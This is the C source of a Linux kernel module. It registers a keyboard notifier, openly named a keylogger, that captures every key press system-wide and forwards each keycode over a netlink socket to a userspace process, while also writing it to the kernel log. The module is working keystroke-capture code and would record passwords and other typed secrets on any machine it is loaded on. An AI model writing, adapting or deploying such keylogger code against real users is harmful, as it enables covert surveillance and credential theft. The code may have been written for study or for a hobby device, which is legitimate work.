#include <linux/module.h>
#include <net/sock.h> 
#include <linux/netlink.h>
#include <linux/skbuff.h>
#include <linux/keyboard.h>
#include <linux/kbd_kern.h>
#include <linux/input.h>

#define NETLINK_USER 32

struct sock *nl_sk_kb = NULL;
static int user_pid = 0;

int counter = 0;

void send_msg_to_user(const char* msg)
{
    if (user_pid == 0)
    {
        return;
    }

    struct sk_buff *skb_out;
    struct nlmsghdr *nlh;
    // char *msg = "Button press detected";
    int msg_size = strlen(msg);
    int res;

    skb_out = nlmsg_new(msg_size, 0);
    if (!skb_out) {
        printk(KERN_ERR "Failed to allocate new skb\n");
        return;
    }

    nlh = nlmsg_put(skb_out, 0, 0, NLMSG_DONE, msg_size, 0);
    NETLINK_CB(skb_out).dst_group = 0; /* not in mcast group */
    strncpy(nlmsg_data(nlh), msg, msg_size);

    res = nlmsg_unicast(nl_sk_kb, skb_out, user_pid);
    if (res < 0)
    {
        printk(KERN_INFO "Error while sending back to user. Clearing user_pid.\n");

        user_pid = 0;
    }
}

static void hello_nl_recv_msg(struct sk_buff *skb)
{
    struct nlmsghdr *nlh;

    printk(KERN_INFO "Entering: %s\n", __FUNCTION__);

    nlh = (struct nlmsghdr *)skb->data;
    printk(KERN_INFO "Netlink received msg payload:%s\n", (char *)nlmsg_data(nlh));
    user_pid = nlh->nlmsg_pid; /* pid of sending process */
}

static int keylogger_notify(struct notifier_block *nblock, unsigned long code, void *_param)
{
    struct keyboard_notifier_param *param = _param;
    struct vc_data *vc = param->vc;

    if (code == KBD_KEYCODE && param->down) 
    {
        char log_msg[100];
        sprintf(log_msg, "Key pressed: %d", param->value);

        printk(KERN_INFO "%s\n", log_msg);
        send_msg_to_user(log_msg);
    }

    return NOTIFY_OK;
}

static struct notifier_block keylogger_nb = {
    .notifier_call = keylogger_notify
};

static int __init hello_init(void)
{
    printk("lvi panel\n");

    register_keyboard_notifier(&keylogger_nb);

    struct netlink_kernel_cfg cfg = {
        .input = hello_nl_recv_msg,
    };

    printk("Entering: %s\n", __FUNCTION__);

    nl_sk_kb = netlink_kernel_create(&init_net, NETLINK_USER, &cfg);
    if (!nl_sk_kb) {
        printk(KERN_ALERT "Error creating socket.\n");
        return -10;
    }

    return 0;
}

static void __exit hello_exit(void)
{
    printk(KERN_INFO "exiting hello module\n");
    netlink_kernel_release(nl_sk_kb);
    unregister_keyboard_notifier(&keylogger_nb);
}

module_init(hello_init); 
module_exit(hello_exit);

MODULE_LICENSE("GPL");